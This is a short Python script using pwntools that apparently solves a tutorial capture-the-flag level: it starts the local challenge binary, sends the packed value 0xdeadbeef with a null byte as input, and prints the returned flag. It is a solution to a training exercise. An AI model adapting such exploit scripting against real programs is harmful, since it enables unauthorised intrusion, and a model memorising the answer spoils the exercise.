from pwn import *

context(arch='amd64', os='linux', log_level='debug')

elf = ELF('/challenge/pwntools-tutorials-level1.0')

p = process(elf.path)

payload = p32(0xdeadbeef,endian='little') + b'\x00'

p.sendlineafter("Enter your input> \n",payload)

flag = p.recvline()

print(f'flag is {flag}')